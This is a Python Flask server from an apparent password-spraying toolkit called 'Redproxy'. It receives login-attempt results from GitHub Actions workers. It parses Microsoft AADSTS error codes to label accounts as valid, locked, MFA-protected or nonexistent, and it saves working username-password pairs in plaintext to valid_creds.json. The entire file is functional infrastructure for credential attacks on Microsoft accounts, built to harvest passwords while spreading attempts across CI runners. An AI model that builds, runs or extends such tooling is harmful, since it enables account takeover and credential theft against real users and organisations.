"""
Redproxy Catcher — receives spray results from GitHub Actions workers.

Supports Microsoft AADSTS error parsing and generic result logging.
Writes structured JSON output alongside human-readable colored console logs.
"""
import os
import sys
import json
import signal
import threading
from datetime import datetime
from pathlib import Path

from flask import Flask, request, jsonify

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from lib.common import setup_logging, log, LogLevel, save_results
from lib.targets.microsoft import AADSTS_CODES

app = Flask(__name__)
logger = setup_logging("catcher")

_lock = threading.Lock()
stats = {
    "total": 0,
    "valid_creds": 0,
    "valid_users": 0,
    "locked": 0,
    "not_found": 0,
    "mfa": 0,
    "errors": 0,
    "workers": 0,
}


def process_microsoft_result(result: dict):
    """Parse and log a Microsoft spray result."""
    username = result.get("username", "?")
    password = result.get("password", "?")
    code = result.get("status_code", 0)
    response = result.get("response", "")

    with _lock:
        stats["total"] += 1

    parsed = {
        "username": username,
        "password": password,
        "status_code": code,
        "timestamp": datetime.utcnow().isoformat(),
        "verdict": "unknown",
    }

    if code == 200:
        log(logger, f"[+] SUCCESS {username} : {password}", LogLevel.SUCCESS)
        parsed["verdict"] = "success"
        with _lock:
            stats["valid_creds"] += 1
        save_results([parsed], filename="valid_creds.json")
        return

    for aadsts_code, (verdict, detail) in AADSTS_CODES.items():
        if aadsts_code in response:
            parsed["verdict"] = verdict
            parsed["detail"] = detail

            if "VALID CREDS" in detail:
                log(logger, f"[+] {username} : {password} — {detail}", LogLevel.SUCCESS)
                with _lock:
                    stats["valid_creds"] += 1
                save_results([parsed], filename="valid_creds.json")
            elif verdict == "invalid_password":
                log(logger, f"[*] Valid user, wrong password: {username}", LogLevel.INFO)
                with _lock:
                    stats["valid_users"] += 1
            elif verdict == "account_locked":
                log(logger, f"[!] LOCKED: {username}", LogLevel.ERROR)
                with _lock:
                    stats["locked"] += 1
            elif verdict == "user_not_found":
                log(logger, f"[-] Not found: {username}", LogLevel.DEBUG)
                with _lock:
                    stats["not_found"] += 1
            elif "mfa" in verdict:
                log(logger, f"[+] {username} : {password} — {detail}", LogLevel.WARNING)
                with _lock:
                    stats["mfa"] += 1
                save_results([parsed], filename="valid_creds.json")
            else:
                log(logger, f"[!] {username} — {detail}", LogLevel.WARNING)

            save_results([parsed], filename="all_results.json")
            return

    log(logger, f"[?] Unknown response for {username}: {response[:100]}", LogLevel.WARNING)
    parsed["verdict"] = "unknown"
    parsed["raw_response"] = response[:500]
    with _lock:
        stats["errors"] += 1
    save_results([parsed], filename="all_results.json")


def process_generic_result(result: dict):
    """Process results from non-Microsoft targets."""
    username = result.get("username", "N/A")
    code = result.get("status_code", 0)
    verdict = result.get("verdict", "unknown")

    with _lock:
        stats["total"] += 1

    if result.get("valid_creds"):
        log(logger, f"[+] VALID: {username} — {verdict}", LogLevel.SUCCESS)
        with _lock:
            stats["valid_creds"] += 1
        save_results([result], filename="valid_creds.json")
    else:
        log(logger, f"[-] {username} — {verdict} (HTTP {code})", LogLevel.DEBUG)

    save_results([result], filename="all_results.json")


@app.route("/wow-amazing", methods=["POST"])
def handle_post_data():
    """Receive spray results from workers."""
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"error": "Invalid JSON"}), 400

    with _lock:
        stats["workers"] += 1

    results = data if isinstance(data, list) else [data]

    for result in results:
        target = result.get("target", "microsoft")
        if target == "microsoft" or "response" in result:
            process_microsoft_result(result)
        else:
            process_generic_result(result)

    return jsonify({
        "status": "ok",
        "processed": len(results),
        "stats": dict(stats),
    })


@app.route("/stats", methods=["GET"])
def get_stats():
    """Return current statistics."""
    return jsonify(dict(stats))


@app.route("/health", methods=["GET"])
def health():
    """Health check endpoint."""
    return jsonify({"status": "running", "stats": dict(stats)})


def print_summary():
    """Print final summary on shutdown."""
    log(logger, "\n" + "=" * 50, LogLevel.INFO)
    log(logger, "FINAL RESULTS SUMMARY", LogLevel.INFO)
    log(logger, "=" * 50, LogLevel.INFO)
    log(logger, f"Total attempts:  {stats['total']}", LogLevel.INFO)
    log(logger, f"Valid creds:     {stats['valid_creds']}", LogLevel.SUCCESS)
    log(logger, f"Valid users:     {stats['valid_users']}", LogLevel.INFO)
    log(logger, f"MFA enforced:    {stats['mfa']}", LogLevel.WARNING)
    log(logger, f"Locked accounts: {stats['locked']}", LogLevel.ERROR)
    log(logger, f"Not found:       {stats['not_found']}", LogLevel.DEBUG)
    log(logger, f"Errors:          {stats['errors']}", LogLevel.ERROR)
    log(logger, f"Workers:         {stats['workers']}", LogLevel.INFO)
    log(logger, "=" * 50, LogLevel.INFO)

    if stats["valid_creds"] > 0:
        log(logger, "\n[!] Check output/valid_creds.json for valid credentials!", LogLevel.SUCCESS)


def signal_handler(sig, frame):
    print_summary()
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Redproxy Catcher — spray results receiver")
    parser.add_argument("-p", "--port", type=int, default=20005, help="Listen port (default: 20005)")
    parser.add_argument("--host", default="0.0.0.0", help="Listen host (default: 0.0.0.0)")
    args = parser.parse_args()

    log(logger, f"Catcher listening on {args.host}:{args.port}", LogLevel.SUCCESS)
    log(logger, f"Endpoint: POST /wow-amazing", LogLevel.INFO)
    log(logger, f"Stats:    GET  /stats", LogLevel.INFO)
    log(logger, f"Output:   output/valid_creds.json, output/all_results.json", LogLevel.INFO)

    app.run(host=args.host, port=args.port, threaded=True)
